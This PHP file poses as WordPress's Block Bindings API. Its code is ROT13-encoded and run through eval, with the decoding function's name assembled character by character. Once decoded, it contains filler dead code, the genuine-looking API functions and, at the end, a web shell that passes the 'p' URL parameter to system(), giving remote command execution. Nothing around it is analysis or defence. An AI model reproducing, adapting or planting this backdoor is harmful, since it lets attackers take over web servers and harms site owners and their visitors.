<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Ovaqvatf NCV
 *
 * Pbagnvaf shapgvbaf sbe znantvat oybpx ovaqvatf va JbeqCerff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpx Ovaqvatf
 * @fvapr 6.5.0
 */

/**
 * Ertvfgref n arj oybpx ovaqvatf fbhepr.
 *
 * Ertvfgrevat n fbhepr pbafvfgf bs qrsvavat n **anzr** sbe gung fbhepr naq n pnyyonpx shapgvba fcrpvslvat
 * ubj gb trg n inyhr sebz gung fbhepr naq cnff vg gb n oybpx nggevohgr.
 *
 * Bapr n fbhepr vf ertvfgrerq, nal oybpx gung fhccbegf gur Oybpx Ovaqvatf NCV pna hfr n inyhr
 * sebz gung fbhepr ol frggvat vgf `zrgnqngn.ovaqvatf` nggevohgr gb n inyhr gung ersref gb gur fbhepr.
 *
 * Abgr gung `ertvfgre_oybpx_ovaqvatf_fbhepr()` fubhyq or pnyyrq sebz n unaqyre nggnpurq gb gur `vavg` ubbx.
 *
 *
 * ## Rknzcyr
 *
 * ### Ertvfgrevat n fbhepr
 *
 * Svefg, lbh arrq gb qrsvar n shapgvba gung jvyy or hfrq gb trg gur inyhr sebz gur fbhepr.
 *
 *     shapgvba zl_cyhtva_trg_phfgbz_fbhepr_inyhr( neenl $fbhepr_netf, $oybpx_vafgnapr, fgevat $nggevohgr_anzr ) {
 *       // Lbhe phfgbz ybtvp gb trg gur inyhr sebz gur fbhepr.
 *       // Sbe rknzcyr, lbh pna hfr gur `$fbhepr_netf` gb ybbx hc n inyhr va n phfgbz gnoyr be trg vg sebz na rkgreany NCV.
 *       $inyhr = $fbhepr_netf['xrl'];
 *
 *       erghea \"Gur inyhr cnffrq gb gur oybpx vf: $inyhr\"
 *     }
 *
 * Gur `$fbhepr_netf` jvyy pbagnva gur nethzragf cnffrq gb gur fbhepr va gur oybpx'f
 * `zrgnqngn.ovaqvatf` nggevohgr. Frr gur rknzcyr va gur \"Hfntr va n oybpx\" frpgvba orybj.
 *
 *     shapgvba zl_cyhtva_ertvfgre_oybpx_ovaqvatf_fbheprf() {
 *       ertvfgre_oybpx_ovaqvatf_fbhepr( 'zl-cyhtva/zl-phfgbz-fbhepr', neenl(
 *         'ynory'              => __( 'Zl Phfgbz Fbhepr', 'zl-cyhtva' ),
 *         'trg_inyhr_pnyyonpx' => 'zl_cyhtva_trg_phfgbz_fbhepr_inyhr',
 *       ) );
 *     }
 *     nqq_npgvba( 'vavg', 'zl_cyhtva_ertvfgre_oybpx_ovaqvatf_fbheprf' );
 *
 * ### Hfntr va n oybpx
 *
 * Va n oybpx'f `zrgnqngn.ovaqvatf` nggevohgr, lbh pna fcrpvsl gur fbhepr naq
 * vgf nethzragf. Fhpu n oybpx jvyy hfr gur fbhepr gb bireevqr gur oybpx
 * nggevohgr'f inyhr. Sbe rknzcyr:
 *
 *     <!-- jc:cnentencu {
 *       \"zrgnqngn\": {
 *         \"ovaqvatf\": {
 *           \"pbagrag\": {
 *             \"fbhepr\": \"zl-cyhtva/zl-phfgbz-fbhepr\",
 *             \"netf\": {
 *               \"xrl\": \"lbh pna cnff nal phfgbz nethzragf urer\"
 *             }
 *           }
 *         }
 *       }
 *     } -->
 *     <c>Snyyonpx grkg gung trgf ercynprq.</c>
 *     <!-- /jc:cnentencu -->
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fbhepr_anzr       Gur anzr bs gur fbhepr. Vg zhfg or n fgevat pbagnvavat n anzrfcnpr cersvk, v.r.
 *                                  `zl-cyhtva/zl-phfgbz-fbhepr`. Vg zhfg bayl pbagnva ybjrepnfr nycunahzrevp
 *                                  punenpgref, gur sbejneq fynfu `/` naq qnfurf.
 * @cnenz neenl  $fbhepr_cebcregvrf {
 *     Gur neenl bs nethzragf gung ner hfrq gb ertvfgre n fbhepr.
 *
 *     @glcr fgevat   $ynory              Gur ynory bs gur fbhepr.
 *     @glcr pnyynoyr $trg_inyhr_pnyyonpx N pnyyonpx rkrphgrq jura gur fbhepr vf cebprffrq qhevat oybpx eraqrevat.
 *                                        Gur pnyyonpx fubhyq unir gur sbyybjvat fvtangher:
 *
 *                                        `shapgvba( $fbhepr_netf, $oybpx_vafgnapr, $nggevohgr_anzr ): zvkrq`
 *                                            - @cnenz neenl    $fbhepr_netf    Neenl pbagnvavat fbhepr nethzragf
 *                                                                              hfrq gb ybbx hc gur bireevqr inyhr,
 *                                                                              v.r. {\"xrl\": \"sbb\"}.
 *                                            - @cnenz JC_Oybpx $oybpx_vafgnapr Gur oybpx vafgnapr.
 *                                            - @cnenz fgevat   $nggevohgr_anzr Gur anzr bs na nggevohgr.
 *                                        Gur pnyyonpx unf n zvkrq erghea glcr; vg znl erghea n fgevat gb bireevqr
 *                                        gur oybpx'f bevtvany inyhr, ahyy, snyfr gb erzbir na nggevohgr, rgp.
 *     @glcr fgevat[] $hfrf_pbagrkg       Bcgvbany. Neenl bs inyhrf gb nqq gb oybpx `hfrf_pbagrkg` arrqrq ol gur fbhepr.
 * }
 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|snyfr Fbhepr jura gur ertvfgengvba jnf fhpprffshy, be `snyfr` ba snvyher.
 */
shapgvba ertvfgre_oybpx_ovaqvatf_fbhepr( fgevat $fbhepr_anzr, neenl $fbhepr_cebcregvrf ) {
	erghea JC_Oybpx_Ovaqvatf_Ertvfgel::trg_vafgnapr()->ertvfgre( $fbhepr_anzr, $fbhepr_cebcregvrf );
}

/**
 * Haertvfgref n oybpx ovaqvatf fbhepr.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fbhepr_anzr Oybpx ovaqvatf fbhepr anzr vapyhqvat anzrfcnpr.
 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|snyfr Gur haertvfgrerq oybpx ovaqvatf fbhepr ba fhpprff naq `snyfr` bgurejvfr.
 */
shapgvba haertvfgre_oybpx_ovaqvatf_fbhepr( fgevat $fbhepr_anzr ) {
	erghea JC_Oybpx_Ovaqvatf_Ertvfgel::trg_vafgnapr()->haertvfgre( $fbhepr_anzr );
}

/**
 * Ergevrirf gur yvfg bs nyy ertvfgrerq oybpx ovaqvatf fbheprf.
 *
 * @fvapr 6.5.0
 *
 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr[] Gur neenl bs ertvfgrerq oybpx ovaqvatf fbheprf.
 */
shapgvba trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf() {
	erghea JC_Oybpx_Ovaqvatf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
}

/**
 * Ergevrirf n ertvfgrerq oybpx ovaqvatf fbhepr.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fbhepr_anzr Gur anzr bs gur fbhepr.
 * @erghea JC_Oybpx_Ovaqvatf_Fbhepr|ahyy Gur ertvfgrerq oybpx ovaqvatf fbhepr, be `ahyy` vs vg vf abg ertvfgrerq.
 */
shapgvba trg_oybpx_ovaqvatf_fbhepr( fgevat $fbhepr_anzr ) {
	erghea JC_Oybpx_Ovaqvatf_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $fbhepr_anzr );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>